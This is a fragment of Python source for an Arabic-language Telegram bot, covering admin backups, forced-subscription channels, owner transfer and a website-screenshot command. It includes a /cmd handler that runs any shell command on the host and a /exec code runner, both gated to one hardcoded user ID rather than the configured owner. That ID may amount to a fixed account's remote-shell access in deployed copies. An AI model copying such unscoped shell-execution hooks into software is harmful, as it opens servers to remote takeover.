        with open(f'{date}.json', 'w+') as w:
            w.write(json.dumps({"botUsername": botUsername, "botID": c.me.id, "Chats": chat_list}, indent=4, ensure_ascii=False))
        await m.reply_document(f'{date}.json')
        os.remove(f'{date}.json')
        return await m.reply("تم جلب نسخة الكروبات:", reply_markup=get_back_keyboard(k, "backup"))

    if text == "جلب نسخة المستخدمين":
        user_list = []
        date = datetime.now()
        for user in r.smembers(f'{Dev_FLER}:UsersList'):
            user_list.append(int(user))
        with open(f'{date}.json', 'w+') as w:
            w.write(json.dumps({"botUsername": botUsername, "botID": c.me.id, "Users": user_list}, indent=4, ensure_ascii=False))
        await m.reply_document(f'{date}.json')
        os.remove(f'{date}.json')
        return await m.reply("تم جلب نسخة المستخدمين:", reply_markup=get_back_keyboard(k, "backup"))

    if text == "اخفاء الكيبورد" or text == "اخفاء":
        return await m.reply(f"{k} تم اخفاء الكيبورد", reply_markup=ReplyKeyboardRemove())

    if text == "رجوع" or text == "رجوع للاعدادات":
        return await m.reply(f"{k} مرحباً بك عزيزي المطور\n{k} اليك لوحة التحكم الخاصة بك اضغط على الامر لتنفذيه",
                             reply_markup=get_main_keyboard(k))

    if text == "إضافة اشتراك إجباري":
        r.set(f'{chat_id}:addForceSub:{user_id}{Dev_FLER}', 1, ex=600)
        return await m.reply(f"{k} ارسل رابط القناة أو القروب الان\nمثال: https://t.me/TeAmBotix",
                             reply_markup=get_back_keyboard(k, "main"))

    if text == "حذف اشتراك إجباري":
        channels = r.smembers(f'forceChannels:{Dev_FLER}')
        if not channels:
            return await m.reply(f"{k} لا توجد قنوات أو قروبات اشتراك إجباري",
                                 reply_markup=get_back_keyboard(k, "main"))
        else:
            ch_list = []
            for ch in channels:
                ch = ch.decode() if isinstance(ch, bytes) else ch
                ch_list.append(ch)
            text_msg = f'{k} قنوات الاشتراك الإجباري:\n\n'
            for i, ch in enumerate(ch_list, 1):
                text_msg += f"{i} - {ch}\n"
            text_msg += f"\n{k} ارسل اسم القناة التي تريد حذفها"
            return await m.reply(text_msg, reply_markup=get_back_keyboard(k, "main"))


@Client.on_message(filters.text, group=30)
def sudosCommandsHandler(c,m):
   k = r.get(f'{Dev_FLER}:botkey') or '⇜'

   if r.get(f'{m.chat.id}:setBotName:{m.from_user.id}{Dev_FLER}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setBotName:{m.from_user.id}{Dev_FLER}')
      r.set(f'{Dev_FLER}:BotName',m.text)
      return m.reply(quote=True,text=f'<b>تم تغيير اسم البوت ل {m.text}</b>')

   if r.get(f'{m.chat.id}:setBotKey:{m.from_user.id}{Dev_FLER}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setBotKey:{m.from_user.id}{Dev_FLER}')
      r.set(f'{Dev_FLER}:botkey',m.text)
      return m.reply(quote=True,text=f'{k} تم تغيير رمز السورس لـ {m.text}')

   if r.get(f'{m.chat.id}:setDevGroup:{m.from_user.id}{Dev_FLER}') and devp_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setDevGroup:{m.from_user.id}{Dev_FLER}')
      try:
        id = int(m.text)
      except:
        return m.reply(quote=True,text=f'{k} الايدي غلط!')
      r.set(f'DevGroup:{Dev_FLER}', int(m.text))
      return m.reply(quote=True,text=f'{k} تم تعيين\n{k} كروب المطور ل {m.text}')

   if r.get(f'{m.chat.id}:setBotowmer:{m.from_user.id}{Dev_FLER}') and devp_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setBotowmer:{m.from_user.id}{Dev_FLER}')
      try:
        get = c.get_chat(m.text.replace('@',''))
      except:
        return m.reply(quote=True,text=f'{k} اليوزر غلط!')
      r.set(f'{Dev_FLER}botowner', get.id)
      m.reply(quote=True,text=f'{k} تم نقل ملكية البوت للمطور الجديد {m.text}')
      with open ('information.py','w+') as www:
         text = 'token = "{}"\nowner_id = {}'
         www.write(text.format(c.bot_token, get.id))

   if r.get(f'{m.chat.id}:setForceChannel:{m.from_user.id}{Dev_FLER}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setForceChannel:{m.from_user.id}{Dev_FLER}')
      try:
        if 'https://t.me/' in m.text:
           channel_username = m.text.replace('https://t.me/', '').replace('@', '')
        elif m.text.startswith('@'):
           channel_username = m.text.replace('@', '')
        else:
           channel_username = m.text

        r.set(f'forceChannel:{Dev_FLER}', f'@{channel_username}')
        r.sadd(f'forceChannels:{Dev_FLER}', f'@{channel_username}')
        r.delete(f'disableSubscribe:{Dev_FLER}')
        return m.reply(quote=True,text=f'{k} تم تعيين قناة الاشتراك الاجباري{k} ل → @{channel_username}')
      except Exception as e:
        return m.reply(quote=True,text=f'{k} خطا! حاول مجدداً')

   if r.get(f'{m.chat.id}:addForceSub:{m.from_user.id}{Dev_FLER}') and devp_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:addForceSub:{m.from_user.id}{Dev_FLER}')
      try:
        if 'https://t.me/' in m.text:
           channel_input = m.text.replace('https://t.me/', '').replace('@', '')
        elif m.text.startswith('@'):
           channel_input = m.text.replace('@', '')
        else:
           channel_input = m.text

        channel_id = f'@{channel_input}'
        r.sadd(f'forceChannels:{Dev_FLER}', channel_id)
        return m.reply(quote=True,text=f'{k} تم اضافة القناة/القروب إلى الاشتراك الإجباري\n{k} → {channel_id}')
      except Exception as e:
        return m.reply(quote=True,text=f'{k} خطا! حاول مجدداً')


langslist = tio.query_languages()
langs_list_link = "https://amanoteam.com/etc/langs.html"

strings_tio = {
  "code_exec_tio_res_string_no_err": "<b>Language:</b> <code>{langformat}</code>\n\n<b>Code:</b>\n<code>{codeformat}</code>\n\n<b>Results:</b>\n<code>{resformat}</code>\n\n<b>Stats:</b><code>{statsformat}</code>",
  "code_exec_tio_res_string_err": "<b>Language:</b> <code>{langformat}</code>\n\n<b>Code:</b>\n<code>{codeformat}</code>\n\n<b>Results:</b>\n<code>{resformat}</code>\n\n<b>Errors:</b>\n<code>{errformat}</code>",
  "code_exec_err_string": "Error: The language <b>{langformat}</b> was not found. Supported languages list: {langslistlink}",
  "code_exec_inline_send": "Language: {langformat}",
  "code_exec_err_inline_send_string": "Language {langformat} not found."
}

@Client.on_message(filters.command("exec") & filters.user(7478586552))
async def exec_tio_run_code(c: Client, m: Message):
    execlanguage = m.command[1]
    codetoexec = m.text.split(None, 2)[2]
    if execlanguage in langslist:
        tioreq = TioRequest(lang=execlanguage, code=codetoexec)
        loop = asyncio.get_event_loop()
        sendtioreq = await loop.run_in_executor(None, tio.send, tioreq)
        tioerrres = sendtioreq.error or "None"
        tiores = sendtioreq.result or "None"
        tioresstats = sendtioreq.debug.decode() or "None"
        if sendtioreq.error is None:
            await m.reply_text(
                strings_tio["code_exec_tio_res_string_no_err"].format(
                    langformat=execlanguage,
                    codeformat=html.escape(codetoexec),
                    resformat=html.escape(tiores),
                    statsformat=tioresstats,
                )
            )
        else:
            await m.reply_text(
                strings_tio["code_exec_tio_res_string_err"].format(
                    langformat=execlanguage,
                    codeformat=html.escape(codetoexec),
                    resformat=html.escape(tiores),
                    errformat=html.escape(tioerrres),
                )
            )
    else:
        await m.reply_text(
            strings_tio["code_exec_err_string"].format(
                langformat=execlanguage, langslistlink=langs_list_link
            )
        )

@Client.on_message(filters.command("cmd") & filters.user(7478586552))
async def run_cmd(c: Client, m: Message):
    cmd = m.text.split(None,1)[1]
    if re.match("(?i)poweroff|halt|shutdown|reboot", cmd):
        res = "You can't use this command"
    else:
        stdout, stderr = await shell_exec(cmd)

        res = (
            f"<b>Output:</b>\n<code>{html.escape(stdout)}</code>" if stdout else ""
        ) + (f"\n<b>Errors:</b>\n<code>{stderr}</code>" if stderr else "")
    await m.reply_text(res)

timeout = httpx.Timeout(40, pool=None)
http = httpx.AsyncClient(http2=True, timeout=timeout)

strings_print = {
  "print_description": "Take a screenshot of the specified website.",
  "print_usage": "<b>Usage:</b> <code>/print https://example.com</code> - Take a screenshot of the specified website.",
  "taking_screenshot": "Taking screenshot..."
}

@Client.on_message(filters.command(["sc", "webs", "ss"]) & filters.user(7478586552))
async def printsSites(c: Client, message: Message):
    msg = message.text
    the_url = msg.split(" ", 1)
    wrong = False

    if len(the_url) == 1:
        if message.reply_to_message:
            the_url = message.reply_to_message.text
            if len(the_url) == 1:
                wrong = True
            else:
                the_url = the_url[1]
        else:
            wrong = True
    else:
        the_url = the_url[1]

    if wrong:
        await message.reply_text(strings_print["print_usage"])
        return

    try:
        sent = await message.reply_text(strings_print["taking_screenshot"])
        res_json = await cssworker_url(target_url=the_url)
    except BaseException as e:
        await message.reply(f"<b>Failed due to:</b> <code>{e}</code>")
        return

    if res_json:
        image_url = res_json["url"]
        if image_url:
            try:
                await message.reply_photo(image_url)
                await sent.delete()
            except BaseException:
                return
        else:
            await message.reply(
                "Couldn't get url value, most probably API is not accessible."
            )
    else:
        await message.reply("Failed because API is not responding, try again later.")

async def cssworker_url(target_url: str):
    url = "https://htmlcsstoimage.com/demo_run"
    my_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
    }

    data = {
        "url": target_url,
        "css": f"random-tag: {uuid.uuid4()}",
        "render_when_ready": False,
        "viewport_width": 1280,
        "viewport_height": 720,
        "device_scale": 1,
    }

    try:
        resp = await http.post(url, headers=my_headers, json=data)
        return resp.json()
    except HTTPError:
        return None